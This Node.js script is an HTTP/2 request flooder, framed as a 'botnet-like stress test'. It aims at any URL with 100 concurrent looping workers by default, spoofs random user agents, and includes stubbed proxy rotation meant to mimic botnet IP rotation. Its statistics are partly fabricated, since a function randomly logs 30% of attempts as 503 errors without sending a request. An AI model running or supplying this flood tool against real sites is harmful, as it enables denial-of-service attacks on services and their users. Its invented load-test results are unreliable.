const http2 = require('http2');
const { URL } = require('url');
const process = require('process');
const { faker } = require('@faker-js/faker'); // Updated import
const axios = require('axios'); 

const args = process.argv.slice(2);
let targetUrl = args[0];
let duration = parseInt(args[1]) || 60;
let threads = parseInt(args[2]) || 100;
let retry = args.includes('-r') ? (args[args.indexOf('-r') + 1] || 1) : 1;
let queryFlag = args.includes('-q') ? (args[args.indexOf('-q') + 1] || 'false') : 'false';

// Log settings
console.log(`Starting test with parameters:
- Target: ${targetUrl}
- Duration: ${duration} seconds
- Threads: ${threads}
- Retry: ${retry}
- Query Flag: ${queryFlag}`);

let statuses = {
    alpn_2: 0,
    h2_200: 0,
    h2_503: 0,
    h2_req: 0,
    errors: 0,
};

const parsedUrl = new URL(targetUrl);
const host = parsedUrl.hostname;
const port = parsedUrl.port || 443;

function simulate503Error() {
    return Math.random() < 0.3; // 30% chance for overload
}

// Function to simulate requests
async function sendHttp2Request(proxy) {
    try {
        const client = http2.connect(targetUrl, {
            // Optional proxy settings (simulate real botnet IP rotation)
            // proxy: proxy || undefined,  // Uncomment this if you use proxies
        });

        statuses.alpn_2 += 1;

        if (simulate503Error()) {
            statuses.h2_503 += 1;
            console.log(`[503 Error] Service Unavailable`);
            client.close();
            return;
        }

        const headers = {
            ':method': 'GET',
            ':scheme': parsedUrl.protocol.replace(':', ''),
            ':authority': host,
            'User-Agent': faker.internet.userAgent(),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'query-flag': queryFlag,  // Query flag
        };

        const req = client.request(headers);

        statuses.h2_req += 1;

        req.on('response', (responseHeaders) => {
            const statusCode = responseHeaders[':status'];
            if (statusCode === 200) {
                statuses.h2_200 += 1;
                console.log(`[200 OK] Request successful`);
            } else if (statusCode === 503) {
                statuses.h2_503 += 1;
                console.log(`[503 Error] Service Unavailable`);
            }
        });

        req.end();

        req.on('close', () => {
            client.close();
        });

        req.on('error', (err) => {
            statuses.errors += 1;
            console.error('Error in request:', err);
        });
    } catch (err) {
        statuses.errors += 1;
        console.error('Connection Error:', err);
    }
}

// Rotate proxies (you can modify this to pull from a file or API)
async function getRandomProxy() {
    // Example of rotating proxies via an external service or predefined list
    const proxyList = [
        'http://proxy1.example.com',
        'http://proxy2.example.com',
        'http://proxy3.example.com',
        // You can add more proxies here or fetch from an external proxy API
    ];
    return proxyList[Math.floor(Math.random() * proxyList.length)];
}

async function worker() {
    const startTime = Date.now();
    while (Date.now() - startTime < duration * 1000) {
        const proxy = await getRandomProxy();  
        await sendHttp2Request(proxy);
    }
}

async function startTest() {
    console.log('Starting botnet-like stress test');
    const workerPromises = [];
    for (let i = 0; i < threads; i++) {
        workerPromises.push(worker());
    }
    await Promise.all(workerPromises);
    console.log('Test completed. Results:');
    console.log(`ALPN Negotiation (alpn_2): ${statuses.alpn_2}`);
    console.log(`HTTP/2 200 Responses (h2_200): ${statuses.h2_200}`);
    console.log(`HTTP/2 503 Errors (h2_503): ${statuses.h2_503}`);
    console.log(`Total HTTP/2 Requests (h2_req): ${statuses.h2_req}`);
    console.log(`Errors: ${statuses.errors}`);
}

startTest().catch((err) => console.error('Error in stress test:', err));
